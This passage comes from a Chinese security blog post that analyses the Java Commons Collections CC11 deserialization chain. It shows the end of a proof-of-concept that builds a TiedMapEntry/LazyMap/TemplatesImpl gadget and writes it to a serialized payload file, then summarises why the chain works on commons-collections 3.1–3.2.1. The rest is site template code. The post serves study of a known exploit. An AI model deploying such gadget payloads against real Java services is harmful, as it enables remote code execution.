class="comment">//setFieldValue(transformer,&quot;iMethodName&quot;,&quot;newTransformer&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,templates);</span><br><span class="line">        HashMap hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">1</span>);</span><br><span class="line">        hm.put(<span class="string">&quot;any&quot;</span>,<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //获取hashset中的hashmap对象属性</span></span><br><span class="line"><span class="comment">//        Field hsset = HashSet.class.getDeclaredField(&quot;map&quot;);</span></span><br><span class="line"><span class="comment">//        hsset.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        HashMap hsmap=(HashMap) hsset.get(hm);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(hm);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc11payload-1.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc11payload-1.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行效果：</p>
+<p><img src="/posts/7e9687c7/cc11-13.png" title="执行效果"></p>
+<h1 id="0x02、总结"><a href="#0x02、总结" class="headerlink" title="0x02、总结"></a>0x02、总结</h1><p>cc11很好理解，cc2+cc6的组合变式，将<code>invokerTransformer</code>利用方向替换为调用<code>newTransformer</code>方法，依旧使用<code>hashset</code>(<code>hashmap</code>同理，cc6中提及)作为反序列化入口，通过<code>TiedMapEntry</code>传入<code>lazymap</code>和<code>TemplatesImpl</code>对象，来达到调用<code>TemplatesImpl.newTransformer</code>的目的触发漏洞。</p>
+<p>cc11也是在cc3.1-3.2.1组件上使用字节码加载的利用链，在之前cc链的字节码加载都是在cc4版本组件上适用，因此cc11链适用范围比前面的利用链跟广。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/6e79ce8b.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-03-14 12:51:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        #Java安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/java%E5%88%A9%E7%94%A8%E9%93%BE/" title="java利用链">
+                        #java利用链
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E3%80%81%E5%88%86%E6%9E%90"><span class="toc-text">0x01、分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E9%A1%BE"><span class="toc-text">回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cc6%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">cc6利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cc11%E5%88%86%E6%9E%90"><span class="toc-text">cc11分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cc11-poc-hashset"><span class="toc-text">cc11-poc(hashset)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cc11-poc-hashmap"><span class="toc-text">cc11-poc(hashmap)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">0x02、总结</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: '5WzQHrZA6gNtoCZa9qWZkFjv-gzGzoHsz',
+        appKey: 'O1mOg3eUPYzPIUYEaX54ip6s',
+        placeholder: 'here',
+        avatar: 'monsterid',
+        lang: 'zh-CN'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Okaytc">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">Copyright © Okaytc 2022</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">一个热爱健身的脚本小子</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%AE%89%E5%85%A8-CC11%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fokaytc.github.io%2Fposts%2F7e9687c7.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://okaytc.github.io/posts/7e9687c7.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
